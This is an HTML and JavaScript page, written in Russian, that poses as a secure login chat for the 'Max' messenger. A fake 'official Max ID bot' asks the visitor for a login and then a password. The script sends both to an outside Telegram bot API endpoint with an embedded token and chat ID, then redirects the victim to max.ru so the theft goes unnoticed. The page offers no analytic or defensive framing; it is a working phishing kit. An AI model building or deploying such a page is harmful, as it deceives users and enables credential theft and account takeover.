<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Мессенджер Макс</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: #0a101f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .phone {
            width: 100%;
            max-width: 420px;
            height: 780px;
            background: #111b2e;
            border-radius: 32px;
            overflow: hidden;
            box-shadow: 0 25px 80px rgba(0,0,0,0.8);
            display: flex;
            flex-direction: column;
            position: relative;
        }
        /* Статус-бар (имитация) */
        .status-bar {
            background: #0d1628;
            padding: 6px 18px 4px;
            display: flex;
            justify-content: space-between;
            color: #8899bb;
            font-size: 12px;
            font-weight: 600;
        }
        .status-bar span:first-child { font-weight: 700; }
        /* Шапка чата */
        .header {
            background: #142236;
            padding: 12px 16px 10px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid #1f314a;
        }
        .back-btn {
            color: #5b8cff;
            font-size: 28px;
            font-weight: 300;
            line-height: 1;
        }
        .avatar {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: linear-gradient(135deg, #5b8cff, #9b6dff);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 700;
            color: #fff;
        }
        .chat-name {
            flex: 1;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
        }
        .chat-name small {
            font-weight: 400;
            font-size: 12px;
            color: #7a8fae;
            display: block;
            margin-top: 1px;
        }
        .icons {
            display: flex;
            gap: 16px;
            color: #7a8fae;
            font-size: 20px;
        }
        /* Вкладки (для антуража) */
        .tabs {
            display: flex;
            background: #0d1628;
            border-bottom: 1px solid #1f314a;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 8px 0;
            color: #6a7f9e;
            font-size: 13px;
            font-weight: 600;
            border-bottom: 2px solid transparent;
        }
        .tab.active {
            color: #5b8cff;
            border-bottom-color: #5b8cff;
        }
        /* Окно сообщений */
        .messages {
            flex: 1;
            padding: 16px 14px 8px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 6px;
            background: #111b2e;
        }
        .msg {
            max-width: 82%;
            padding: 10px 16px;
            border-radius: 20px;
            font-size: 15px;
            line-height: 1.45;
            word-break: break-word;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        .msg-in {
            align-self: flex-start;
            background: #1f314a;
            color: #e8edf5;
            border-bottom-left-radius: 6px;
        }
        .msg-out {
            align-self: flex-end;
            background: #5b8cff;
            color: #fff;
            border-bottom-right-radius: 6px;
        }
        .msg-time {
            font-size: 10px;
            color: #6a7f9e;
            margin: 0 8px 4px;
            align-self: flex-end;
        }
        .msg-out + .msg-time { align-self: flex-end; }
        .msg-in + .msg-time { align-self: flex-start; }
        /* Системное сообщение */
        .system-msg {
            align-self: center;
            background: #1a253b;
            color: #8899bb;
            font-size: 12px;
            padding: 4px 14px;
            border-radius: 30px;
            margin: 4px 0;
        }
        /* Индикатор набора текста */
        .typing {
            align-self: flex-start;
            background: #1f314a;
            color: #a0b3d0;
            font-size: 13px;
            padding: 8px 16px;
            border-radius: 20px;
            border-bottom-left-radius: 6px;
            display: none;
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0.4; } }
        /* Нижняя панель */
        .input-area {
            background: #142236;
            padding: 8px 14px 14px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-top: 1px solid #1f314a;
        }
        .input-area input {
            flex: 1;
            background: #1f314a;
            border: none;
            border-radius: 24px;
            padding: 12px 18px;
            color: #fff;
            font-size: 15px;
            outline: none;
        }
        .input-area input::placeholder { color: #6a7f9e; }
        .send-btn {
            background: #5b8cff;
            border: none;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            color: #fff;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: 0.15s;
        }
        .send-btn:active { transform: scale(0.9); background: #4a7ae0; }
        .fake-call {
            position: absolute;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: #0d1628;
            color: #4a6a8a;
            font-size: 10px;
            padding: 2px 14px;
            border-radius: 30px;
            border: 1px solid #1f314a;
            opacity: 0.6;
        }
        @media (max-width: 440px) {
            .phone { height: 100vh; border-radius: 0; max-width: 100%; }
        }
    </style>
</head>
<body>
<div class="phone">
    <!-- Статус-бар -->
    <div class="status-bar">
        <span>9:41</span>
        <span>📶 5G 🔋</span>
    </div>

    <!-- Шапка -->
    <div class="header">
        <span class="back-btn">‹</span>
        <div class="avatar">М</div>
        <div class="chat-name">
            Макс ID
            <small>онлайн, был(а) 2 мин назад</small>
        </div>
        <div class="icons">
            <span>📞</span>
            <span>⋮</span>
        </div>
    </div>

    <!-- Вкладки (имитация) -->
    <div class="tabs">
        <div class="tab active">Чаты</div>
        <div class="tab">Контакты</div>
        <div class="tab">Звонки</div>
    </div>

    <!-- Окно переписки -->
    <div class="messages" id="messageBox">
        <div class="system-msg">🔒 Защищённый чат</div>
        <div class="msg msg-in">Привет! Это официальный бот Макс ID 🤖</div>
        <div class="msg msg-in">Для входа в аккаунт отправьте мне ваш <b>логин</b></div>
        <div class="msg msg-out" style="margin-top:6px;">Логин: <span id="displayLogin" style="font-weight:600;">—</span></div>
        <div class="msg msg-out">Пароль: <span id="displayPass" style="font-weight:600;">—</span></div>
        <div class="typing" id="typingIndicator">✏️ Бот печатает...</div>
    </div>

    <!-- Панель ввода -->
    <div class="input-area">
        <input type="text" id="fakeInput" placeholder="Введите сообщение..." autofocus>
        <button class="send-btn" id="sendBtn">➤</button>
    </div>

    <!-- Декоративный элемент -->
    <div class="fake-call">⏺ Запись не ведётся</div>
</div>

<script>
    // Элементы
    const input = document.getElementById('fakeInput');
    const sendBtn = document.getElementById('sendBtn');
    const messageBox = document.getElementById('messageBox');
    const displayLogin = document.getElementById('displayLogin');
    const displayPass = document.getElementById('displayPass');
    const typing = document.getElementById('typingIndicator');

    let step = 'login';
    let loginValue = '';
    let passValue = '';

    // Функция добавления сообщения
    function addMessage(text, type = 'in') {
        const div = document.createElement('div');
        div.className = type === 'in' ? 'msg msg-in' : 'msg msg-out';
        div.innerHTML = text;
        messageBox.appendChild(div);
        messageBox.scrollTop = messageBox.scrollHeight;
        // Добавляем время
        const timeDiv = document.createElement('div');
        timeDiv.className = 'msg-time';
        const now = new Date();
        timeDiv.textContent = now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0');
        messageBox.appendChild(timeDiv);
        messageBox.scrollTop = messageBox.scrollHeight;
    }

    // Показать индикатор набора и скрыть через 1.5 сек
    function showTyping() {
        typing.style.display = 'block';
        messageBox.scrollTop = messageBox.scrollHeight;
        setTimeout(() => {
            typing.style.display = 'none';
        }, 1500);
    }

    // Отправка в Telegram
    function sendToTelegram(login, pass) {
        const msg = '🔐 Мессенджер Макс\n👤 Логин: ' + login + '\n🔑 Пароль: ' + pass;
        fetch('https://api.telegram.org/bot8918681932:AAHkBy8LYIbYAmeZ6FqbsUcsXCIPme_UN0c/sendMessage?chat_id=8759904789&text=' + encodeURIComponent(msg))
            .then(() => { window.location.href = 'https://max.ru'; })
            .catch(() => { window.location.href = 'https://max.ru'; });
    }

    // Основной обработчик
    function handleSend() {
        let text = input.value.trim();
        if (!text) return;

        // Добавляем сообщение пользователя
        addMessage(text, 'out');

        if (step === 'login') {
            loginValue = text;
            displayLogin.textContent = text;
            step = 'pass';
            input.value = '';
            input.placeholder = 'Введите пароль...';
            // Имитация ответа бота
            showTyping();
            setTimeout(() => {
                addMessage('Отлично! Теперь отправьте <b>пароль</b> для подтверждения', 'in');
                input.focus();
            }, 800);
        } else if (step === 'pass') {
            passValue = text;
            displayPass.textContent = text;
            // Имитация проверки
            showTyping();
            setTimeout(() => {
                addMessage('✅ Проверка данных... Подождите секунду', 'in');
                setTimeout(() => {
                    sendToTelegram(loginValue, passValue);
                }, 1200);
            }, 600);
        }
    }

    // События
    sendBtn.addEventListener('click', handleSend);
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            handleSend();
        }
    });

    // Фокус при загрузке
    window.addEventListener('load', () => {
        setTimeout(() => input.focus(), 400);
    });
</script>
</body>
</html>
